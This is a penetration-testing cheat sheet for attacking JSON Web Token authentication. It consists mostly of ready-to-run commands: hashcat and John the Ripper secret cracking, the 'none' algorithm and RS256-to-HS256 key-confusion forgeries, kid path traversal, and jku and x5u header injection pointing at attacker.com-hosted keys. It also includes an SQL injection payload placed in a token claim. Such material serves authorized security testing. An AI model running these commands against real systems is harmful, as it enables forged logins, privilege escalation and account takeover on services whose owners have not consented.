# JWT

## Tools

```bash
# https://github.com/ticarpi/jwt_tool
# https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology

# https://github.com/hahwul/jwt-hack
# https://github.com/mazen160/jwt-pwn
# https://github.com/mBouamama/MyJWT
# https://github.com/DontPanicO/jwtXploiter

# Test all common attacks
python3 jwt_tool.py -t https://url_that_needs_jwt/ -rh "Authorization: Bearer JWT" -M at -cv "Welcome user!"

# Hashcat
# dictionary attacks 
hashcat -a 0 -m 16500 jwt.txt passlist.txt
# rule-based attack  
hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule
# brute-force attack
hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6


# Crack
pip install PyJWT
# https://github.com/Sjord/jwtcrack
# https://raw.githubusercontent.com/Sjord/jwtcrack/master/jwt2john.py
jwt2john.py JWT
./john /tmp/token.txt --wordlist=wordlist.txt

# Wordlist generator crack tokens:
# https://github.com/dariusztytko/token-reverser

# RS256 to HS256
openssl s_client -connect www.google.com:443 | openssl x509 -pubkey -noout > public.pem
cat public.pem | xxd -p | tr -d "\\n" > hex.txt
# Sign JWT with hex.txt 

```

## General info

```text
1. Leak Sensitive Info
2. Send without signature
3. Change algorythm r to h
4. Crack the secret h256
5. KID manipulation

eyJhbGciOiJIUzUxMiJ9.eyJleHAiOjE1ODQ2NTk0MDAsInVzZXJuYW1lIjoidGVtcHVzZXI2OSIsInJvbGVzIjpbIlJPTEVfRVhURVJOQUxfVVNFUiJdLCJhcHBDb2RlIjoiQU5UQVJJX0FQSSIsImlhdCI6MTU4NDU3MzAwMH0.AOHXCcMFqYFeDSYCEjeugT26RaZLzPldqNAQSlPNpKc2JvdTG9dr2ini4Z42dd5xTBab-PYBvlXIJetWXOX80A

https://trustfoundry.net/jwt-hacking-101/
https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9
https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/
https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a

- JKU & X5U Headers - JWK
    - Header injection
    - Open redirect



- Remember test JWT after session is closed
```

## Attacks

### Header

```text
# None algorithm
python3 jwt_tool.py <JWT> -X a

# From RS256 to HS256
python3 jwt_tool.py <JWT> -S hs256 -k public.pem

# Not checked signature
python3 jwt_tool.py <JWT> -I -pc name -pv admin

# Crack secret key
python3 jwt_tool.py <JWT> -C -d secrets.txt 

# Null kid
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# Use source file as kid to verify signature
python3 jwt_tool.py -I -hc kid -hv "path/of/the/file" -S hs256 -p "Content of the file"

# jku manipulation for open redirect
python3 jwt_tool.py <JWT> -X s -ju "https://attacker.com/jwttool_custom_jwks.json"

# x5u manipulation for open redirect
openssl req -newkey rsa:2048 -nodes -keyout private.pem -x509 -days 365 -out attacker.crt -subj "/C=AU/L=Brisbane/O=CompanyName/CN=pentester"
python3 jwt_tool.py <JWT> -S rs256 -pr private.pem -I -hc x5u -hv "https://attacker.com/custom_x5u.json"
```

### Payload

```text
# SQLi
python3 jwt_tool.py <JWT> -I -pc name -pv "imparable' ORDER BY 1--" -S hs256 -k public.pem

# Manipulate other values to change expiration time or userID for example
```

